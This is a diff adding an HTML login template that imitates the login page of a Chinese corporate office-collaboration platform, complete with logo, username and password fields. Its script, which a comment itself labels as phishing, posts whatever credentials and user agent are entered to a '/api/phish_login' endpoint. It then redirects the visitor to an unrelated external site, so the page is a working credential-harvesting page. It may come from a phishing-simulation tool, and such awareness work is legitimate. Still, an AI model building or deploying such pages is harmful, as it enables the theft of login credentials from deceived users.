@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>蒙泰协同办公平台</title>
+    <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #1a4b7a url('{{ url_for('static', filename='images/03.png') }}') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Microsoft YaHei', Arial, sans-serif;
+        }
+        .login-box {
+            background: none;
+            width: 350px;
+            margin: 80px auto 0 auto;
+            border-radius: 10px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            padding: 40px 30px 30px 30px;
+            position: relative;
+        }
+        .login-logo {
+            display: block;
+            margin: 0 auto 20px auto;
+            width: 160px;
+            max-width: 90%;
+        }
+        .login-title {
+            text-align: center;
+            font-size: 22px;
+            color: #0b1a32;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+        .login-input {
+            width: 100%;
+            padding: 12px 14px;
+            margin-bottom: 18px;
+            border: 1px solid #b0c4de;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px 0;
+            background: #0b1a32;
+            color: #bacde0;
+            font-size: 18px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background: #13305a;
+        }
+        .login-remember {
+            display: flex;
+            align-items: center;
+            margin-bottom: 18px;
+        }
+        .login-remember input[type="checkbox"] {
+            margin-right: 6px;
+        }
+        .login-footer {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .login-footer a {
+            color: #bacde0;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-bg-mask"></div>
+    <div class="login-box">
+        <img src="{{ url_for('static', filename='mtlogo42.png') }}" alt="logo" class="login-logo">
+        <div class="login-title">协同办公平台</div>
+        <input type="text" id="loginid" class="login-input" placeholder="登录名/手机号码" autocomplete="off" autofocus>
+        <input type="password" id="userpassword" class="login-input" placeholder="登录密码" autocomplete="off">
+        <div class="login-remember">
+            <input type="checkbox" id="remember-account"><label for="remember-account">记住账号</label>
+            <input type="checkbox" id="remember-password" style="margin-left:18px;"><label for="remember-password">记住密码</label>
+        </div>
+        <button id="submit" class="login-btn">登 录</button>
+        <div class="login-footer">
+            <a href="https://xiaoe.ai/?source=31&kw=baidupinzhuan-pc-dh-bj" target="_blank">忘记密码</a>
+        </div>
+    </div>
+    <script>
+    // 极简钓鱼交互：输入框可输入，按钮可点，POST到后端
+    document.addEventListener('DOMContentLoaded', function() {
+        var loginBtn = document.getElementById('submit');
+        var loginInput = document.getElementById('loginid');
+        var pwdInput = document.getElementById('userpassword');
+        if (loginBtn && loginInput && pwdInput) {
+            loginBtn.addEventListener('click', function() {
+                var username = loginInput.value.trim();
+                var password = pwdInput.value;
+                if (!username || !password) {
+                    alert('请输入账号和密码');
+                    return;
+                }
+                fetch('/api/phish_login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        scene: 'oa_login', // 钓鱼页面标识，可根据实际页面调整
+                        user_agent: navigator.userAgent,
+                        extra_info: '' // 预留扩展字段
+                    })
+                })
+                .finally(function() {
+                    window.location.href = 'https://xiaoe.ai/?source=31&kw=baidupinzhuan-pc-dh-bj';
+                });
+            });
+            // 支持回车提交
+            [loginInput, pwdInput].forEach(function(input) {
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') loginBtn.click();
+                });
+            });
+        }
+    });
+    </script>
+</body>
+</html>
